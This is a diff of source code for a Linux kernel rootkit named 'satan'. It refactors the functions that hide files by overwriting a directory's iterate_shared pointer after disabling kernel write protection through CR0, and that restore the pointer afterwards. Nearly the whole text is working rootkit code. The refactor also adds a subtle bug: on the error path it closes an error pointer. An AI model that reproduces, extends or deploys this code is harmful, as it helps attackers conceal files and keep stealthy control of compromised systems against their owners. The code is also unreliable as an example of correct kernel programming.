@@ -71,8 +71,8 @@ asmlinkage long satan_lstat64(const char __user *filename,
 
 
 
-static int satan_file_hook_parent_dir_iterate_shared(struct hidden_file *f);
-static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file *f);
+static int satan_file_hook_iterate_shared(struct hidden_file *f);
+static int satan_file_unhook_iterate_shared(const struct hidden_file *f);
 
 static struct hidden_file *hidden_files_list_add(const char *path)
 {
@@ -211,7 +211,7 @@ int satan_file_exit(void)
 
         list_for_each_safe(p, tmp, &hidden_files_list) {
                 f = list_entry(p, struct hidden_file, list);
-                satan_file_unhook_parent_dir_iterate_shared(f);
+                satan_file_unhook_iterate_shared(f);
 
                 pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
                 list_del(p);
@@ -229,7 +229,7 @@ int satan_file_exit(void)
 int satan_file_hide(const char *path)
 {
         struct hidden_file *f = hidden_files_list_add(path);
-        return satan_file_hook_parent_dir_iterate_shared(f);
+        return satan_file_hook_iterate_shared(f);
 }
 
 int satan_file_unhide(const char *path)
@@ -241,7 +241,7 @@ int satan_file_unhide(const char *path)
                 return 1;
         }
 
-        if (satan_file_unhook_parent_dir_iterate_shared(f) != 0) {
+        if (satan_file_unhook_iterate_shared(f) != 0) {
                 return 1;
         }
 
@@ -253,53 +253,83 @@ int satan_file_unhide(const char *path)
 }
 
 
-static int satan_file_hook_parent_dir_iterate_shared(struct hidden_file *f)
+/**
+ * satan_file_hook_iterate_shared() - hooks the `iterate_shared()` function pointer
+ * of the specified file's parent directory.
+ *
+ * @hidden_file: the information wrapper of a hidden file.
+ *
+ * Return: zero on success and non-zero otherwise.
+ */
+static int satan_file_hook_iterate_shared(struct hidden_file *f)
 { 
+        ret = 0;
         filp = filp_open(f->basename, O_RDONLY, 0);
 
         if (IS_ERR(filp)) {
                 pr_alert("satan: failed to open %s\n", f->basename);
-                return 1;
-        } else {
-                f_op = (struct file_operations *) filp->f_op;
-
-                // If we haven't memorized the real iterate_shared() of this directory,
-                // add it to the list.
-                if (!real_iterate_shared_list_get(f->basename))
-                        real_iterate_shared_list_add(f->basename, f_op->iterate_shared);
-
-
-                CR0_WP_DISABLE {
-                        pr_info("satan: iterate_shared: %p\n", f_op->iterate_shared);
-                        pr_alert("satan: hijacking iterate from %p to %p.\n",
-                                 f_op->iterate_shared, satan_iterate_shared);
-                        f_op->iterate_shared = satan_iterate_shared;
-                } CR0_WP_DISABLE_END
-                return 0;
+                ret = 1;
+                goto out;
         }
+
+        f_op = (struct file_operations *) filp->f_op;
+
+        // If we haven't memorized the real iterate_shared() of this directory,
+        // add it to the list.
+        if (!real_iterate_shared_list_get(f->basename))
+                real_iterate_shared_list_add(f->basename, f_op->iterate_shared);
+
+
+        CR0_WP_DISABLE {
+                pr_info("satan: iterate_shared: %p\n", f_op->iterate_shared);
+                pr_alert("satan: hijacking iterate from %p to %p.\n",
+                                f_op->iterate_shared, satan_iterate_shared);
+                f_op->iterate_shared = satan_iterate_shared;
+        } CR0_WP_DISABLE_END
+
+out:
+        if (filp)
+                filp_close(filp, NULL);
+
+        return ret;
 }
 
-static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file *f)
+/**
+ * satan_file_unhook_iterate_shared() - Unhooks the `iterate_shared()` function pointer
+ * of the specified file's parent directory.
+ *
+ * @hidden_file: the information wrapper of a hidden file.
+ *
+ * Return: zero on success and non-zero otherwise.
+ */
+static int satan_file_unhook_iterate_shared(const struct hidden_file *f)
 {
+        ret = 0;
         filp = filp_open(f->basename, O_RDONLY, 0);
 
         if (IS_ERR(filp)) {
                 pr_alert("satan: failed to open %s:\n", f->basename);
-                return 1;
-        } else {
-                f_op = (struct file_operations *) filp->f_op;
-
-                // Get the real iterate_shared() of this directory from `real_iterate_shared_list`.
-                real_iterate_shared = (void *) real_iterate_shared_list_get(f->basename);
-
-
-                CR0_WP_DISABLE {
-                        pr_info("satan: restoring iterate_shared from %p to %p\n",
-                                f_op->iterate_shared, real_iterate_shared);
-                        f_op->iterate_shared = real_iterate_shared;
-                } CR0_WP_DISABLE_END
-                return 0;
+                ret = 1;
+                goto out;
         }
+
+        f_op = (struct file_operations *) filp->f_op;
+
+        // Get the real iterate_shared() of this directory from `real_iterate_shared_list`.
+        real_iterate_shared = (void *) real_iterate_shared_list_get(f->basename);
+
+
+        CR0_WP_DISABLE {
+                pr_info("satan: restoring iterate_shared from %p to %p\n",
+                        f_op->iterate_shared, real_iterate_shared);
+                f_op->iterate_shared = real_iterate_shared;
+        } CR0_WP_DISABLE_END
+
+out:
+        if (filp)
+                filp_close(filp, NULL);
+
+        return ret;
 }
 
 
